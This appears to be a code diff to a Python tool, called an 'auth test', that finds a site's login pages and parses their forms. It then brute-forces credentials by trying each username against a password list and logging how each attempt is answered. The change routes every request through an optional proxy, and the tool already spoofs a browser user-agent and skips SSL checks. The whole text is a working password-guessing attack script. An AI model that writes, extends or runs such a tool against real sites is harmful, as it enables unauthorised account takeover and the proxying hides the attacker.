@@ -18,9 +18,9 @@ DEFAULT_HEADERS = {
                    "Chrome/100.0.4896.127 Safari/537.36")
 }
 
-async def fetch(session: aiohttp.ClientSession, url: str) -> Dict:
+async def fetch(session: aiohttp.ClientSession, url: str, proxy: str = None) -> Dict:
     try:
-        async with session.get(url, headers=DEFAULT_HEADERS, timeout=15, ssl=False) as resp:
+        async with session.get(url, headers=DEFAULT_HEADERS, timeout=15, proxy=proxy, ssl=False) as resp:
             text = await resp.text()
             return {"url": str(resp.url), "status": resp.status, "body": text}
     except Exception as e:
@@ -54,8 +54,8 @@ def classify_page_content(html: str, url: str) -> str:
     # Use NLP on HTML content for a better guess (simple sentiment analogy)
     return classify_response_with_nlp(html)
 
-async def discover_related_pages(session: aiohttp.ClientSession, base_url: str) -> Dict[str, List[str]]:
-    html_resp = await fetch(session, base_url)
+async def discover_related_pages(session: aiohttp.ClientSession, base_url: str, proxy: str = None) -> Dict[str, List[str]]:
+    html_resp = await fetch(session, base_url, proxy=proxy)
     soup = BeautifulSoup(html_resp["body"], "html.parser")
     links = soup.find_all("a", href=True)
     found_pages = {"login": [], "register": [], "forgot_password": []}
@@ -109,14 +109,14 @@ def prepare_payload(inputs: Dict[str, str], username_field: str, username: str, 
     data[password_field] = password
     return data
 
-async def attempt_login(session: aiohttp.ClientSession, url: str, method: str, data: Dict):
+async def attempt_login(session: aiohttp.ClientSession, url: str, method: str, data: Dict, proxy: str = None):
     try:
         start = time.time()
         if method == "post":
-            async with session.post(url, data=data, headers=DEFAULT_HEADERS, ssl=False) as resp:
+            async with session.post(url, data=data, headers=DEFAULT_HEADERS, proxy=proxy, ssl=False) as resp:
                 text = await resp.text()
         else:
-            async with session.get(url, params=data, headers=DEFAULT_HEADERS, ssl=False) as resp:
+            async with session.get(url, params=data, headers=DEFAULT_HEADERS, proxy=proxy, ssl=False) as resp:
                 text = await resp.text()
         elapsed = time.time() - start
         response_class = classify_response_with_nlp(text)
@@ -137,11 +137,11 @@ async def load_passwords(file_path="passwords.txt") -> List[str]:
         logging.warning(f"Failed to load passwords.txt: {e}, using default small list.")
         return ["password123", "admin", "test", "letmein", "123456"]
 
-async def run_auth_test(login_url: str, usernames: List[str], password_list: List[str], config: Dict):
+async def run_auth_test(login_url: str, usernames: List[str], password_list: List[str], config: Dict, proxy: str = None):
     logging.info(f"Starting advanced auth test on {login_url}")
 
     async with aiohttp.ClientSession() as session:
-        page_resp = await fetch(session, login_url)
+        page_resp = await fetch(session, login_url, proxy=proxy)
         if page_resp["status"] == 0:
             logging.error(f"Failed to fetch login page {login_url}, aborting auth test.")
             return
@@ -152,14 +152,14 @@ async def run_auth_test(login_url: str, usernames: List[str], password_list: Lis
             logging.error(f"{e}, aborting auth test.")
             return
 
-        related_pages = await discover_related_pages(session, login_url)
+        related_pages = await discover_related_pages(session, login_url, proxy=proxy)
         logging.info(f"Discovered related pages: {related_pages}")
 
         results = []
         for username in usernames:
             for i, password in enumerate(password_list):
                 payload = prepare_payload(form_info["inputs"], form_info["username_field"], username, form_info["password_field"], password)
-                res = await attempt_login(session, form_info["action"], form_info["method"], payload)
+                res = await attempt_login(session, form_info["action"], form_info["method"], payload, proxy=proxy)
                 results.append({"username": username, "attempt": i + 1, "password": password, **res})
                 logging.info(f"User '{username}' attempt {i+1} password '{password}' resulted in {res['response_class']}")
 
